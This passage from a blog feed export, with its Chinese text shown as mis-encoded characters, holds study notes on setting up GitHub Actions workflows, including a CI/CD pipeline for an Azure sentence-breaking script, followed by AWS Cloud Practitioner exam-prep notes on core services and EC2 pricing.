class="string">actions/checkout@v3</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&#x27;14&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">bats</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">bats</span> <span class="string">-v</span></span><br></pre></td></tr></table></figure></li><li>commit é€™æ¬¡çš„æ›´å‹•ï¼Œä¸¦ push åˆ° repository</li></ul><h2 id="Workflows-File-é€è¡Œè§£é‡‹"><a href="#Workflows-File-é€è¡Œè§£é‡‹" class="headerlink" title="Workflows File é€è¡Œè§£é‡‹"></a>Workflows File é€è¡Œè§£é‡‹</h2><p>åƒè€ƒ: <a href="https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore">Workflow Syntax</a></p><ul><li><code>name</code> : æŒ‡å®šWorkflowåç¨±ï¼Œä¸¦æœƒå‡ºç¾åœ¨Repositoryä¸­çš„Action Tab</li><li><code>run-name</code> : æ¯æ¬¡é‹è¡Œè©²Workflowæ™‚æœƒå‡ºç¾çš„æ–‡å­—è¨Šæ¯ï¼Œé€™é‚ŠæŒ‡å®š repo username + â€œis learning Github Actionsâ€</li></ul><p><img src="https://i.imgur.com/B5l23tf.png"></p><ul><li><code>on</code> : æŒ‡å®šæœƒè§¸ç™¼ Workflows çš„è¡Œç‚ºï¼Œé€™è£¡ä½¿ç”¨ <code>push</code> eventï¼Œæ‰€ä»¥ä¾ä½†æœ‰äºº pushæ›´å‹•åˆ° repositoryï¼Œå‰‡æœƒè§¸ç™¼ Workflowsçš„åŸ·è¡Œ</li><li><code>jobs</code> : å°‡ Workflowsç•¶ä¸­çš„jobçµ„åˆåœ¨ä¸€èµ·</li><li><code>check-bats-version</code> : è‡ªå®šç¾©Jobçš„åç¨±</li><li><code>runs-on</code>: è¨­å®šJobåŸ·è¡Œåœ¨OSç‚ºæœ€æ–°ç‰ˆæœ¬çš„Ubuntu Linuxçš„Runnerä¸Šï¼Œæ­¤æŒ‡å®šæœƒè§¸ç™¼Hostedæ‰€è¨—ç®¡çš„è™›æ“¬æ©Ÿè¢«å»ºç«‹ã€‚</li><li><code>steps</code>: å°‡ <code>check-bats-version</code> job åº•ä¸‹çš„æ‰€æœ‰stepçµ„åˆå†ä¸€èµ·</li><li><code>uses</code>:ã€€ç”¨ä¾†æŒ‡å®šstepçš„å‘½ä»¤æˆ–è¡Œç‚º<ul><li><code>actions/checkout@v3</code>: ä»£è¡¨è¦åŸ·è¡Œv3ç‰ˆæœ¬çš„actions&#x2F;checkoutè¡Œç‚ºï¼Œ<strong>æ­¤æ­¥é©Ÿæœƒå°‡ä½ çš„repo checkoutåˆ°Runnerä¸Šï¼Œä¸¦å…è¨±ä½ é‡å°ä½ çš„ç¨‹å¼é€²è¡Œæ“ä½œï¼Œæ¯ç•¶ä½ çš„Workflowå°‡é‡å°Repositoryçš„ç¨‹å¼é‹è¡Œæ™‚ï¼Œéƒ½æ‡‰è©²ä½¿ç”¨ checkout æ“ä½œ</strong></li><li><code>actions/setup-node@v3</code>: æ­¤æ­¥é©Ÿæœƒå®‰è£æŒ‡å®šç‰ˆæœ¬çš„NodeJS(æ­¤ç¯„ä¾‹ä¸­è¦–ç‰ˆæœ¬1)</li></ul></li><li><code>run</code> : runæŒ‡ä»¤æœƒå‘Šè¨´ jobåœ¨Runnerä¸­åŸ·è¡Œç‰¹å®šæŒ‡ä»¤ï¼Œæ­¤ç¯„ä¾‹çµ‚ç©¶æ˜¯å‘Šè¨´Jobåœ¨Runnerä¸­åŸ·è¡Œ npm install batsï¼Œä»¥åŠä¸‹ä¸€æ­¥å‰‡æ˜¯å»æŸ¥çœ‹ batsç‰ˆæœ¬</li></ul><h2 id="å°‹æ‰¾ä»¥åŠè‡ªå®šç¾©-Actions"><a href="#å°‹æ‰¾ä»¥åŠè‡ªå®šç¾©-Actions" class="headerlink" title="å°‹æ‰¾ä»¥åŠè‡ªå®šç¾© Actions"></a>å°‹æ‰¾ä»¥åŠè‡ªå®šç¾© Actions</h2><p>ä¸€å€‹Actionå¯ä»¥è¢«å®šç¾©åœ¨:</p><ul><li>èˆ‡ä½ Workflowæª”æ¡ˆç›¸åŒçš„Repositoryç•¶ä¸­</li><li>æ‰€æœ‰å…¬é–‹çš„Repository</li><li>DockerHubä¸­çš„å·²ç™¼å¸ƒçš„å®¹å™¨imageç•¶ä¸­</li></ul><h3 id="Github-Action-Martketplace"><a href="#Github-Action-Martketplace" class="headerlink" title="Github Action Martketplace"></a>Github Action Martketplace</h3><p><a href="https://github.com/marketplace?type=actions">Marketplaceé€£çµ</a></p><p><img src="https://i.imgur.com/oFXdxsj.png"></p><p>åœ¨Marketplace ç•¶ä¸­æœ‰è¨±å¤šå…¶ä»–è²¢ç»è€…æ‰€æä¾›çš„Actionï¼Œå¯ä»¥ä¸‹è¼‰</p><p><img src="https://i.imgur.com/TFdKxou.png"></p><p>æ¯å€‹Actionç•¶ä¸­æœƒæœ‰æä¾›ç›¸æ‡‰çš„YAML Synatxå¯ä»¥è¤‡è£½ä¸¦è²¼ä¸Šè‡³è‡ªå·±çš„Workflowæª”æ¡ˆç•¶ä¸­ï¼Œè‹¥Actionéœ€è¦ä½ æä¾›Inputï¼Œå‰‡éœ€è¦é¡å¤–è¨­å®šWorkflowï¼Œå¯åƒè€ƒé€™ä»½æ–‡ä»¶<br>ï¼Œ<a href="https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions#using-inputs-and-outputs-with-an-action">https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions#using-inputs-and-outputs-with-an-action</a></p><h3 id="åœ¨ç›¸åŒRepositoryåº•ä¸‹æ·»åŠ -Action"><a href="#åœ¨ç›¸åŒRepositoryåº•ä¸‹æ·»åŠ -Action" class="headerlink" title="åœ¨ç›¸åŒRepositoryåº•ä¸‹æ·»åŠ  Action"></a>åœ¨ç›¸åŒRepositoryåº•ä¸‹æ·»åŠ  Action</h3><p><em>ç¯„ä¾‹æª”æ¡ˆçµæ§‹</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|-- hello-world (repository)</span><br><span class="line">|   |__ .github</span><br><span class="line">|       â””â”€â”€ workflows</span><br><span class="line">|           â””â”€â”€ my-first-workflow.yml</span><br><span class="line">|       â””â”€â”€ actions</span><br><span class="line">|           |__ hello-world-action</span><br><span class="line">|               â””â”€â”€ action.yml</span><br></pre></td></tr></table></figure><p><em>ç¯„ä¾‹ Workflow æª”</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jobs:</span><br><span class="line">  build:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    steps:</span><br><span class="line">      # This step checks out a copy of your repository.</span><br><span class="line">      - uses: actions/checkout@v3</span><br><span class="line">      # This step references the directory that contains the action.</span><br><span class="line">      - uses: ./.github/actions/hello-world-action</span><br></pre></td></tr></table></figure><p>synatx: <code>./path/to/dir</code></p><p>è€Œ action.yml æ˜¯ç‚ºäº†Actionæä¾›Metadataç”¨çš„ã€‚</p><h3 id="å¾ä¸åŒ-Repository-åŠ å…¥-Action"><a href="#å¾ä¸åŒ-Repository-åŠ å…¥-Action" class="headerlink" title="å¾ä¸åŒ Repository åŠ å…¥ Action"></a>å¾ä¸åŒ Repository åŠ å…¥ Action</h3><p>é€™æ™‚åœ¨ä½ çš„workflowæª”ç•¶ä¸­çš„ use åº•ä¸‹å°±éœ€è¦æŒ‡å®š <code>&#123;owner&#125;/&#123;repo&#125;@&#123;ref&#125;</code> ä¾†æ¨™æ˜ reference actionçš„repoï¼Œç¯„ä¾‹:  <code>actions/setup-node@v3</code></p><h3 id="å¼•ç”¨-DockerHubä¸Šçš„å®¹å™¨"><a href="#å¼•ç”¨-DockerHubä¸Šçš„å®¹å™¨" class="headerlink" title="å¼•ç”¨ DockerHubä¸Šçš„å®¹å™¨"></a>å¼•ç”¨ DockerHubä¸Šçš„å®¹å™¨</h3><p>æ­¤æ™‚ syntaxéœ€è¦æ”¹æˆ: <code>docker://&#123;image&#125;:&#123;tag&#125;</code></p><h2 id="å¯¦ä½œ-Azure-Break-Sentence-CI-x2F-CD-Pipeline"><a href="#å¯¦ä½œ-Azure-Break-Sentence-CI-x2F-CD-Pipeline" class="headerlink" title="å¯¦ä½œ: Azure Break Sentence CI&#x2F;CD Pipeline"></a>å¯¦ä½œ: Azure Break Sentence CI&#x2F;CD Pipeline</h2><p><em>æ•´é«”æ¶æ§‹åœ–</em><br><img src="https://i.imgur.com/OvSfq3m.png"></p><h3 id="Eventéœ€æ±‚"><a href="#Eventéœ€æ±‚" class="headerlink" title="Eventéœ€æ±‚"></a>Eventéœ€æ±‚</h3><h3 id="Runner-ç’°å¢ƒå¥—ä»¶è¨­å®š"><a href="#Runner-ç’°å¢ƒå¥—ä»¶è¨­å®š" class="headerlink" title="Runner ç’°å¢ƒå¥—ä»¶è¨­å®š"></a>Runner ç’°å¢ƒå¥—ä»¶è¨­å®š</h3><ul><li>OS: Ubuntu Linux</li><li>Python 3.8.10</li><li>Environment Variables<ul><li>AZURE_API_KEY</li><li>AZURE_LOCATION</li></ul></li></ul><blockquote><p>æ„Ÿè¦ºå¯ä»¥è‡ªå®šç¾©Actions</p></blockquote><h3 id="Break-Sentence"><a href="#Break-Sentence" class="headerlink" title="Break Sentence"></a>Break Sentence</h3><p><img src="https://i.imgur.com/kd6kJ2X.png"></p><p>ğŸ§ªç›®æ¨™: <strong>åœ¨ä½¿ç”¨è€…ä¸Šå‚³æª”æ¡ˆæ™‚ï¼Œå°±èƒ½å¤ æ“·å–è£¡é¢çš„æ–‡ç« ï¼Œå»å‘¼å«BreakSentence.py é€²è¡Œæ–·å¥ï¼Œå†ä¿å­˜åˆ°ç‰¹å®šOuput Folder</strong></p><h3 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h3><ul><li><input checked="" disabled="" type="checkbox"> Azure API Key è¢«Disable  -&gt; è®Šæ›´ä¿¡ç®±é‡æ–°è¨»å†Šæˆ–ä»˜è²»çºŒè¨‚</li><li><input checked="" disabled="" type="checkbox"> æ¸¬è©¦ YMLæª”é€éç’°å¢ƒè®Šæ•¸æ–¹å¼ä¾†å­˜å–Secrets</li><li><input checked="" disabled="" type="checkbox"> è®Šæ›´Repositoryä¸­æ‰€å­˜æ”¾çš„Secretså€¼</li><li><input checked="" disabled="" type="checkbox"> <code>BreakSentence.py</code> -&gt; éœ€åŠ ä¸Šè®€æª”åŠŸèƒ½<ul><li><input disabled="" type="checkbox"> å¯èƒ½è¦å¯ä»¥é–‹æ–‡å­—æª”ä»¥åŠExcelæª”</li></ul></li><li><input checked="" disabled="" type="checkbox"> <code>BreakSentence.py</code> -&gt; è¦åŒ…è£æˆæŒ‡ä»¤å·¥å…·</li></ul><p><img src="https://i.imgur.com/xnAfxMl.png"><br><del>ç›®å‰åœ¨Setup Pythonå°±æœƒå‡ºéŒ¯</del> âœ…å·²è§£æ±º</p><p><img src="https://i.imgur.com/Sz9BA33.png"><br><del>æ²’æœ‰æŒ‡å®š Moduleï¼Œéœ€ç”¨pip æŒ‡ä»¤å®‰è£ç‰¹å®šæ¨¡çµ„</del> âœ…å·²è§£æ±º</p><p><img src="https://i.imgur.com/McSwZ3L.png"><br><del>ç„¡æ³•å­˜å–Secretä¸­çš„å€¼ä½œç‚ºç’°å¢ƒè®Šæ•¸</del> âœ…å·²è§£æ±º<br>éœ€è¦å°‡env å€æ®µæ”¾åˆ°run breaksentence.pyçš„å€æ®µåº•ä¸‹<br><img src="https://i.imgur.com/tlKx4k7.png"></p><p><img src="https://i.imgur.com/2AFUYyK.png"><br>åŸ·è¡ŒæˆåŠŸ </p><p><img src="https://i.imgur.com/ortWe1v.png"></p><p>ç›®å‰è…³æœ¬ä¸­åªæœ‰æŠŠapi callçš„reponseå°å‡ºä¾†ä»¥åŠåˆ‡å¥å­å­˜åœ¨List<br>ä¸‹ä¸€æ­¥é©Ÿå°±æ˜¯æ”¹è®Šè¼¸å…¥è¼¸å‡ºæ–¹å¼</p><h2 id="åƒè€ƒè³‡æ–™"><a href="#åƒè€ƒè³‡æ–™" class="headerlink" title="åƒè€ƒè³‡æ–™"></a>åƒè€ƒè³‡æ–™</h2><p>[1]<a href="https://ithelp.ithome.com.tw/articles/10266827">https://ithelp.ithome.com.tw/articles/10266827</a><br>[2]<a href="https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions">https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions</a><br>[3]<a href="https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions">https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions</a><br>[4] <a href="https://ithelp.ithome.com.tw/articles/10266828">Github Action Pushåˆ°Azureé›²ç«¯</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¸ç¿’ç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CI/CD </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ”‹ AWS Certified Cloud Practitioner è­‰ç…§æº–å‚™ç­†è¨˜</title>
      <link href="/posts/e8acb5ee.html"/>
      <url>/posts/e8acb5ee.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/x1Sq6so.png"></p><h1 id="CCP-æº–å‚™"><a href="#CCP-æº–å‚™" class="headerlink" title="CCP æº–å‚™"></a>CCP æº–å‚™</h1><ul><li><p><strong>è€ƒè©¦æŒ‡å—</strong>: <a href="https://d1.awsstatic.com/zh_TW/training-and-certification/docs-cloud-practitioner/AWS-Certified-Cloud-Practitioner_Exam-Guide.pdf">https://d1.awsstatic.com/zh_TW/training-and-certification/docs-cloud-practitioner/AWS-Certified-Cloud-Practitioner_Exam-Guide.pdf</a></p></li><li><p><strong>è€ƒè©¦é¡Œå‹å æ¯”</strong><br><img src="https://i.imgur.com/xv5xcGu.png"></p></li><li><p><strong>ç›¸é—œè³‡æº</strong></p><ul><li><a href="https://terahake.in/post/aws-ccp-certified-exp/">https://terahake.in/post/aws-ccp-certified-exp/</a></li><li><a href="https://awslc.medium.com/aws-cloud-practitioner%E8%AD%89%E7%85%A7%E6%BA%96%E5%82%99-6b8bacc6a490">https://awslc.medium.com/aws-cloud-practitioner%E8%AD%89%E7%85%A7%E6%BA%96%E5%82%99-6b8bacc6a490</a></li><li><a href="https://jayendrapatil.com/aws-certified-cloud-practitioner-exam-learning-path/?fbclid=IwAR3eiyroyZ_jTn2pA5ut_ophP8JNCzgspERnug_luC_HGltA-OkLwRwrhAU">https://jayendrapatil.com/aws-certified-cloud-practitioner-exam-learning-path/?fbclid=IwAR3eiyroyZ_jTn2pA5ut_ophP8JNCzgspERnug_luC_HGltA-OkLwRwrhAU</a></li><li><a href="https://d1.awsstatic.com/whitepapers/AWS_Cloud_Best_Practices.pdf?fbclid=IwAR1xXOBkWwESyy_9Srngna7rAbP_g1ddYMl2KO3moKJbzz1YDgrNOrv_z08">https://d1.awsstatic.com/whitepapers/AWS_Cloud_Best_Practices.pdf?fbclid=IwAR1xXOBkWwESyy_9Srngna7rAbP_g1ddYMl2KO3moKJbzz1YDgrNOrv_z08</a></li><li><a href="https://d0.awsstatic.com/whitepapers/aws_pricing_overview.pdf?fbclid=IwAR2mDUgA-IDHrqrQFGn3XL1kA0O1XojD6d6rdxwLWmvuL4D4mi4DKeDNonQ">https://d0.awsstatic.com/whitepapers/aws_pricing_overview.pdf?fbclid=IwAR2mDUgA-IDHrqrQFGn3XL1kA0O1XojD6d6rdxwLWmvuL4D4mi4DKeDNonQ</a></li><li><a href="http://yhhuang1966.blogspot.com/2020/03/aws-aws-certified-cloud-practitioner.html">http://yhhuang1966.blogspot.com/2020/03/aws-aws-certified-cloud-practitioner.html</a></li></ul></li><li><p><strong>æ¨¡æ“¬è€ƒé«”</strong></p><ul><li><a href="https://www.examtopics.com/exams/amazon/aws-certified-cloud-practitioner/">https://www.examtopics.com/exams/amazon/aws-certified-cloud-practitioner/</a></li></ul></li></ul><h2 id="Well-Architectäº”å¤§æ”¯æŸ±"><a href="#Well-Architectäº”å¤§æ”¯æŸ±" class="headerlink" title="Well-Architectäº”å¤§æ”¯æŸ±"></a>Well-Architectäº”å¤§æ”¯æŸ±</h2><ul><li>å“è¶Šç‡Ÿé‹<ul><li>èƒ½å¤ åŸ·è¡Œå’Œç›£æ§ç³»çµ±ä»¥å¯¦ç¾å•†æ¥­åƒ¹å€¼ï¼Œä¸¦æŒçºŒæå‡æ”¯æ´æµç¨‹å’Œç¨‹åºçš„èƒ½åŠ›ã€‚</li></ul></li><li>å®‰å…¨æ€§<ul><li>æ˜¯ä¿è­·è³‡è¨Šã€ç³»çµ±å’Œè³‡ç”¢ï¼ŒåŒæ™‚é€éé¢¨éšªè©•ä¼°å’Œç·©è§£ç­–ç•¥ä¾†å¯¦ç¾å•†æ¥­åƒ¹å€¼çš„èƒ½åŠ›</li></ul></li><li>å¯é æ€§<ul><li>å¾åŸºç¤è¨­æ–½æˆ–æœå‹™ä¸­æ–·ä¸­æ¢å¾©</li><li>å‹•æ…‹å–å¾—é‹ç®—è³‡æºä»¥æ»¿è¶³éœ€æ±‚</li><li>æ¸›å°‘é…ç½®ä¸ç•¶æˆ–æš«æ™‚æ€§ç¶²è·¯å•é¡Œç­‰ä¸­æ–·æƒ…æ³</li></ul></li><li>æ•ˆèƒ½é”æˆæ•ˆç‡<ul><li>ç”¨é‹ç®—è³‡æºä»¥ç¬¦åˆç³»çµ±éœ€æ±‚ï¼Œä¸¦åœ¨éœ€æ±‚è®ŠåŒ–å’ŒæŠ€è¡“å‡ç´šæ™‚ç¶­æŒæ•ˆç‡çš„èƒ½åŠ›</li></ul></li><li>æˆæœ¬æœ€ä½³åŒ–<ul><li>æ˜¯èƒ½ä»¥æœ€ä½åƒ¹æ ¼é»åŸ·è¡Œç³»çµ±ä¾†æä¾›å•†æ¥­åƒ¹å€¼çš„èƒ½åŠ›ã€‚</li></ul></li></ul><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="Amazon-Athena"><a href="#Amazon-Athena" class="headerlink" title="Amazon Athena"></a>Amazon Athena</h3><ul><li>é€éæ¨™æº–SQLäº’å‹•å¼Queryä¾†åœ¨S3ç•¶ä¸­åˆ†æè³‡æ–™</li><li>ç„¡ä¼ºæœå™¨</li><li>å¯å®šç¾©Schemaä¸¦è—‰ç”±SQLä¾†åœ¨S3ç•¶ä¸­åˆ†æè³‡æ–™</li></ul><h3 id="Amazon-Kinesis"><a href="#Amazon-Kinesis" class="headerlink" title="Amazon Kinesis"></a>Amazon Kinesis</h3><ul><li>å¯ä»¥è¼•é¬†åœ°è’é›†ã€è™•ä¾‹ä¸¦åˆ†æå³æ™‚ä¸²æµè³‡æ–™</li><li>åƒæ˜¯å½±éŸ³ä¸²æµã€æ‡‰ç”¨ç¨‹å¼æ—¥èªŒã€ç¶²é é»æ“Šåˆ†æã€IoTé™æ¸¬è³‡æ–™ç­‰ç­‰<ul><li>Amazon Kinesis Data Firhose</li><li>Amazon Kinesis Data Analytics</li><li>Amazon Kinesis Data Streams</li><li>Amazon Kinesis Video Streams</li></ul></li></ul><h3 id="Amazon-QuickSight"><a href="#Amazon-QuickSight" class="headerlink" title="Amazon QuickSight"></a>Amazon QuickSight</h3><ul><li>å¼·å¤§çš„BI(Business intelligent)æœå‹™</li><li>å¯å»ºç«‹äº’å‹•å¼dashboard</li></ul><h2 id="æ‡‰ç”¨ç¨‹å¼æ•´åˆ"><a href="#æ‡‰ç”¨ç¨‹å¼æ•´åˆ" class="headerlink" title="æ‡‰ç”¨ç¨‹å¼æ•´åˆ"></a>æ‡‰ç”¨ç¨‹å¼æ•´åˆ</h2><h3 id="Amazon-Simple-Notification-Service-Amazon-SNS"><a href="#Amazon-Simple-Notification-Service-Amazon-SNS" class="headerlink" title="Amazon Simple Notification Service (Amazon SNS)"></a>Amazon Simple Notification Service (Amazon SNS)</h3><ul><li>ä¸€ç¨®ç™¼å¸ƒ&#x2F;è¨‚é–±æœå‹™ã€‚å¦‚ä½¿ç”¨ Amazon SNS ä¸»é¡Œï¼Œç™¼å¸ƒè€…å¯å°‡è¨Šæ¯ç™¼å¸ƒçµ¦è¨‚é–±è€…ã€‚é€™ç¨®æ–¹å¼å¦‚åŒåœ¨å’–å•¡åº—è£¡ï¼Œæ”¶éŠ€å“¡å‘è£½ä½œé£²æ–™çš„å’–å•¡å¸«æä¾›å’–å•¡è¨‚å–®ä¸€æ¨£ã€‚</li><li>åœ¨ Amazon SNS ä¸­ï¼Œè¨‚é–±è€…å¯èƒ½æ˜¯ Web ä¼ºæœå™¨ã€é›»å­éƒµä»¶åœ°å€ã€AWS Lambda å‡½æ•¸æˆ–å…¶ä»–å¹¾ç¨®é¸é …</li></ul><h3 id="Amazon-Simple-Queue-Service-Amazon-SQS"><a href="#Amazon-Simple-Queue-Service-Amazon-SQS" class="headerlink" title="Amazon Simple Queue Service (Amazon SQS)"></a>Amazon Simple Queue Service (Amazon SQS)</h3><ul><li>Amazon Simple Queue Service (Amazon SQS) æ˜¯ä¸€ç¨®è¨Šæ¯ä½‡åˆ—æœå‹™</li><li>åœ¨ Amazon SQS ä¸­ï¼Œæ‡‰ç”¨ç¨‹å¼æœƒå°‡è¨Šæ¯å‚³é€åˆ°ä½‡åˆ—ä¸­ã€‚ä½¿ç”¨è€…æˆ–æœå‹™æœƒå¾ä½‡åˆ—æ“·å–è¨Šæ¯ï¼ŒåŠ ä»¥è™•ç†å¾Œï¼Œå¾ä½‡åˆ—ä¸­åˆªé™¤è¨Šæ¯</li><li></li></ul><h2 id="é‹ç®—å’Œç„¡ä¼ºæœå™¨"><a href="#é‹ç®—å’Œç„¡ä¼ºæœå™¨" class="headerlink" title="é‹ç®—å’Œç„¡ä¼ºæœå™¨"></a>é‹ç®—å’Œç„¡ä¼ºæœå™¨</h2><h3 id="AWS-Batch"><a href="#AWS-Batch" class="headerlink" title="AWS Batch"></a>AWS Batch</h3><h3 id="Amazon-EC2"><a href="#Amazon-EC2" class="headerlink" title="Amazon EC2"></a>Amazon EC2</h3><ul><li>åŸ·è¡Œå€‹é«”é¡å‹<ul><li>ä¸€èˆ¬ç”¨é€”<ul><li>æ‡‰ç”¨ç¨‹å¼ä¸­çš„é‹ç®—ã€è¨˜æ†¶é«”å’Œç¶²è·¯åŠŸèƒ½è³‡æºéœ€æ±‚å¤§è‡´ç›¸åŒ</li></ul></li><li>é‹ç®—æœ€ä½³åŒ–<ul><li>éœ€è¦é‹ç®—å¯†é›†å‹çš„æ‡‰ç”¨</li><li>éœ€è¦è™•ç†å–®ä¸€ç¾¤çµ„ä¸­æœ‰å¤šç­†äº¤æ˜“çš„æ‰¹æ¬¡è™•ç†å·¥ä½œè² è¼‰æ™‚ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨é‹ç®—æœ€ä½³åŒ–åŸ·è¡Œå€‹é«”</li></ul></li><li>è¨˜æ†¶é«”æœ€ä½³åŒ–<ul><li>åœ¨æ–¼ç‚ºè¨˜æ†¶é«”å…§è™•ç†å¤§å‹è³‡æ–™é›†çš„å·¥ä½œè² è¼‰æä¾›å¿«é€Ÿæ•ˆèƒ½ã€‚åœ¨é‹ç®—ä¸­ï¼Œè¨˜æ†¶é«”æ˜¯æš«æ™‚å„²å­˜å€ã€‚å®ƒæœƒä¿ç•™ä¸­å¤®è™•ç†å–®å…ƒï¼ˆCPUï¼‰å®Œæˆå‹•ä½œæ‰€éœ€çš„æ‰€æœ‰è³‡æ–™å’ŒæŒ‡ä»¤ã€‚</li><li>å·¥ä½œè² è¼‰éœ€è¦åœ¨åŸ·è¡Œæ‡‰ç”¨ç¨‹å¼ä¹‹å‰é å…ˆè¼‰å…¥å¤§é‡è³‡æ–™ã€‚æ­¤ç¨®æƒ…æ³å¯èƒ½æ˜¯é«˜æ•ˆèƒ½è³‡æ–™åº«ï¼Œæˆ–è€…éœ€è¦åŸ·è¡Œå¤§é‡éçµæ§‹åŒ–è³‡æ–™å³æ™‚è™•ç†çš„å·¥ä½œè² è¼‰</li></ul></li><li>åŠ é€Ÿé‹ç®—æœ€ä½³åŒ–<ul><li>ä½¿ç”¨ç¡¬é«”åŠ é€Ÿå™¨æˆ–å”åŒè™•ç†å™¨ä¾†æé«˜åŸ·è¡ŒæŸäº›åŠŸèƒ½çš„æ•ˆç‡ï¼Œå…¶æ•ˆæœæ›´å‹åœ¨ CPU ä¸ŠåŸ·è¡Œè»Ÿé«”çš„å¯è¡Œæ•ˆç‡</li><li>ä½¿ç”¨ç¡¬é«”åŠ é€Ÿå™¨æˆ–å”åŒè™•ç†å™¨ä¾†æé«˜åŸ·è¡ŒæŸäº›åŠŸèƒ½çš„æ•ˆç‡ï¼Œå…¶æ•ˆæœæ›´å‹åœ¨ CPU ä¸ŠåŸ·è¡Œè»Ÿé«”çš„å¯è¡Œæ•ˆç‡</li></ul></li><li>å„²å­˜æœ€ä½³åŒ–<ul><li>å°ˆç‚ºéœ€è¦å°æœ¬æ©Ÿå„²å­˜é«”ä¸Šçš„è¶…å¤§å‹è³‡æ–™é›†é€²è¡Œé«˜åºåˆ—è®€å–åŠå¯«å…¥å­˜å–å·¥ä½œè² è¼‰æ‰€è¨­è¨ˆã€‚é©åˆå„²å­˜æœ€ä½³åŒ–åŸ·è¡Œå€‹é«”çš„å·¥ä½œè² è¼‰åŒ…æ‹¬åˆ†æ•£å¼æª”æ¡ˆç³»çµ±ã€è³‡æ–™å€‰å„²æ‡‰ç”¨ç¨‹å¼ï¼Œä»¥åŠé«˜é »ç·šä¸Šäº¤æ˜“è™•ç† (OLTP) ç³»çµ±</li><li>ç‚ºæ‡‰ç”¨ç¨‹å¼æä¾›æ¯ç§’æ•¸è¬æ¬¡ä½å»¶é²çš„éš¨æ©Ÿ I&#x2F;O æ“ä½œ (IOPS) è€Œè¨­è¨ˆ</li><li>æ‡‰ç”¨ç¨‹å¼å…·æœ‰é«˜ IOPS éœ€æ±‚</li></ul></li></ul></li><li>EC2 å®šåƒ¹<ul><li>éš¨éœ€(On-Demand)<ul><li>é©ç”¨ä¸å¯ä¸­æ–·çŸ­æœŸçš„å·¥ä½œè² è¼‰</li><li>ç„¡é ˆåˆç´„</li></ul></li><li>Saving Plan<ul><li>æ‰¿è«¾ä¸€å¹´æˆ–ä¸‰å¹´å…§ç¶­æŒä¸€å®šçš„é‹ç®—é‡</li><li>æ¯”éš¨éœ€ä¾¿å®œ</li></ul></li><li>é ç•™åŸ·è¡Œå€‹é«”<ul><li>å¯è³¼è²·ä¸€å¹´æˆ–ä¸‰å¹´æœŸçš„åŸ·è¡Œå€‹é«”</li><li>ç”¨é‡å¯ä»¥æ ¹æ“šå¸³æˆ¶ä¸­çš„éš¨éœ€åŸ·è¡Œå€‹é«”è€Œå®š</li></ul></li><li>SpotåŸ·è¡Œå€‹é«”<ul><li>é©åˆå¯ä»¥æ‰¿å—ä¸­æ–·çš„æ‡‰ç”¨</li><li>åƒæ˜¯æ‰¹æ¬¡ä»»å‹™</li></ul></li><li>å°ˆç”¨ä¸»æ©Ÿ<ul><li>å¯¦é«”EC2ä¼ºæœå™¨</li></ul></li></ul></li></ul><h3 id="AWS-Elastic-Beanstalk"><a href="#AWS-Elastic-Beanstalk" class="headerlink" title="AWS Elastic Beanstalk"></a>AWS Elastic Beanstalk</h3><ul><li>åœ¨æ‚¨æä¾›ç¨‹å¼ç¢¼å’Œçµ„æ…‹è¨­å®šå¾Œï¼ŒElastic Beanstalk æœƒè² è²¬éƒ¨ç½²åŸ·è¡Œä¸‹åˆ—ä»»å‹™æ‰€éœ€çš„è³‡æº<ul><li>èª¿æ•´å®¹é‡</li><li>è² è¼‰å¹³è¡¡</li><li>è‡ªå‹•æ“´å±•</li><li>æ‡‰ç”¨ç¨‹å¼é‹ä½œç‹€æ…‹ç›£æ§</li></ul></li></ul><h3 id="AWS-Lambda"><a href="#AWS-Lambda" class="headerlink" title="AWS Lambda"></a>AWS Lambda</h3><p><img src="https://i.imgur.com/iOCFQm5.png"></p><h3 id="Amazon-Lightsail"><a href="#Amazon-Lightsail" class="headerlink" title="Amazon Lightsail"></a>Amazon Lightsail</h3><ul><li>Amazon Lightsail ä»¥ç¶“æ¿Ÿé«˜æ•ˆçš„æ¯æœˆåƒ¹æ ¼ï¼Œæä¾›æ˜“æ–¼ä½¿ç”¨çš„è™›æ“¬ç§æœ‰ä¼ºæœå™¨ (VPS) åŸ·è¡Œå€‹é«”ã€å®¹å™¨ã€å„²å­˜ã€è³‡æ–™åº«ç­‰ã€‚</li></ul><h3 id="Amazon-WorkSpaces"><a href="#Amazon-WorkSpaces" class="headerlink" title="Amazon WorkSpaces"></a>Amazon WorkSpaces</h3><ul><li>Amazon WorkSpaces æ˜¯ä¸€ç¨®ç”¨æ–¼ Windows å’Œ Linux 